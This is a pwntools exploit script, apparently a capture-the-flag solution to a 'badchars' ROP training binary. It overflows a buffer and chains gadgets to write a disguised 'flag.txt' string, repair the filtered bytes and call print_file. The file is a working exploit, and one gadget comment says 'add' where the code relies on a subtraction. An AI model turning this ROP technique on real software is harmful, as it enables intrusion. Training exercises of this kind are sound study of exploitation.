#!/bin/python3

from pwn import *

elf = ELF('./badchars')
libc = elf.libc

p = process(elf.path)
elf_rop = ROP(elf)

pop_r12_pop_r13_ret = elf_rop.find_gadget(['pop r12', 'pop r13'])[0]
pop_r14_pop_r15_ret = elf_rop.find_gadget(['pop r14', 'pop r15'])[0]
pop_r15_ret = elf_rop.find_gadget(['pop r15', 'ret'])[0]
pop_rdi_ret = elf_rop.find_gadget(['pop rdi', 'ret'])[0]

useful_sub_gadget = 0x400630 # add BYTE PTR [r15],r14b ; ret
useful_mov_gadget = 0x400634 # mov QWORD PTR [r13+0x0],r12 ; ret

"""

It took me a second to realize that I can't just use the base address of
    of the .data section like I did before or the character filtering will
    mess up the addresses you provide to fix the jumbled up string.

"""
string_location = 0x601030

# Write a jumbled flag.txt string into memory
chain = p64(pop_r12_pop_r13_ret)        \
    + b'flbh/tyt'                       \
    + p64(string_location)              \
    + p64(0)                            \
    + p64(0)                            \
    + p64(useful_mov_gadget)

# Fix the letter a
chain += p64(pop_r14_pop_r15_ret)       \
    + p64(1)                            \
    + p64(string_location + 2)          \
    + p64(useful_sub_gadget)

# Fix the letter g
chain += p64(pop_r15_ret)               \
    + p64(string_location + 3)          \
    + p64(useful_sub_gadget)

# Fix the period
chain += p64(pop_r15_ret)               \
    + p64(string_location + 4)          \
    + p64(useful_sub_gadget)

# Fix the letter x
chain += p64(pop_r15_ret)               \
    + p64(string_location + 6)          \
    + p64(useful_sub_gadget)

# Call their shared object function with the fixed string
chain += p64(pop_rdi_ret)               \
    + p64(string_location)              \
    + p64(elf.plt['print_file'])

payload = b'i' * 0x28 + chain
p.sendline(payload)

p.interactive() # gg2ez

